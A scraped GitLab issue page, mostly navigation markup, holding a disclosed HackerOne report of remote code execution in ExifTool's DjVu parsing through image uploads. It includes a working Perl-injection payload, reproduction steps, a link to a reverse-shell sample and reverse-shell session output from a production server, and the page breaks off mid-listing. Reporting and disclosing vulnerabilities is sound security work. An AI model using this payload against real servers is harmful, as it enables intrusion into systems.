registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;infrastructure_registry&quot;,&quot;title&quot;:&quot;Terraform modules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/terraform_module_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:278964,&quot;name&quot;:&quot;GitLab&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"GitLab","item":"https://gitlab.com/gitlab-org/gitlab"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab/-/issues"},{"@type":"ListItem","position":4,"name":"#327121","item":"https://gitlab.com/gitlab-org/gitlab/-/issues/327121"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;GitLab&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#327121&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues/327121&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/327121&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/new?add_related_issue=327121&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/327121&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab/-/issues/327121/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/327121&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/327121.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#327121&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=327121\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:1,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;RCE when removing metadata with ExifTool&quot;,&quot;initialTitleText&quot;:&quot;RCE when removing metadata with ExifTool&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003cp data-sourcepos=\&quot;1:1-1:96\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;1:1-1:70\&quot;\u003e\u003ca data-sourcepos=\&quot;1:3-1:68\&quot; href=\&quot;https://hackerone.com/reports/1154542\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #1154542\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;1:76-1:80\&quot;\u003evakzz\u003c/code\u003e on 2021-04-07:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:87\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;3:1-3:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;3:21-3:47\&quot; href=\&quot;#attachments\&quot;\u003eAttachments\u003c/a\u003e | \u003ca data-sourcepos=\&quot;3:51-3:87\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;5:1-5:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;7:1-7:16\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;8:1-8:279\&quot; dir=\&quot;auto\&quot;\u003eWhen uploading image files, GitLab Workhorse passes any files with the extensions \u003ca data-sourcepos=\&quot;8:83-8:198\&quot; href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104\&quot;\u003ejpg|jpeg|tiff\u003c/a\u003e through to \u003ca data-sourcepos=\&quot;8:211-8:243\&quot; href=\&quot;https://exiftool.org/\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eExifTool\u003c/a\u003e to remove any non-whitelisted tags.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;10:1-10:244\&quot; dir=\&quot;auto\&quot;\u003eAn issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;12:1-12:288\&quot; dir=\&quot;auto\&quot;\u003eOne of the supported formats is \u003ca data-sourcepos=\&quot;12:33-12:114\&quot; href=\&quot;https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eDjVu\u003c/a\u003e. When parsing the DjVu annotation, the \u003ca data-sourcepos=\&quot;12:155-12:254\&quot; href=\&quot;https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003etokens are evaled\u003c/a\u003e to \&quot;convert C escape sequences\&quot;.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;14:1-14:214\&quot; dir=\&quot;auto\&quot;\u003eThere is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;16:1-21:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e(metadata  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\t(Copyright \&quot;\\  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\&quot; . qx{echo vakzz \u0026gt;/tmp/vakzz} . \\  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\&quot; b \&quot;) )  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;23:1-23:313\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;23:1-23:106\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;echo_vakzz.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e is an example DjVu file with the above metadata, and \u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;23:161-23:272\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;reverse_shell.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e is an example that runs a reverse shell.\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;25:1-25:27\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to reproduce\u003c/h5\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;26:1-32:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;26:1-26:133\&quot;\u003eDownload \u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;26:13-26:118\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;echo_vakzz.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e and unzip it\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;27:1-27:25\&quot;\u003eCreate a new snippet\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;28:1-28:50\&quot;\u003eIn the description field, hit \&quot;Attach a file\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;29:1-29:39\&quot;\u003eSelect and uplaod \u003ccode data-sourcepos=\&quot;29:23-29:36\&quot;\u003eecho_vakzz.jpg\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;30:1-32:0\&quot;\u003eSee that the file \u003ccode data-sourcepos=\&quot;30:23-30:32\&quot;\u003e/tmp/vakzz\u003c/code\u003e has been created on the server\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;33:1-33:200\&quot; dir=\&quot;auto\&quot;\u003eUploading \u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;33:11-33:122\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;reverse_shell.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e to \u003ca href=\&quot;https://gitlab.com/-/snippets/new\&quot;\u003ehttps://gitlab.com/-/snippets/new\u003c/a\u003e resulted in a shell on \u003ccode data-sourcepos=\&quot;33:185-33:198\&quot;\u003eweb-09-sv-gprd\u003c/code\u003e:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;35:1-329:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eConnection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eid  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003euid=500(git) gid=500(git) groups=500(git)  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003ehostname -a  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eweb-09-sv-gprd  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eps auxww  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         4  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [kworker/0:0H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         6  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [mm_percpu_wq]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        18  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [kworker/1:0H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        24  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [kworker/2:0H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot        28  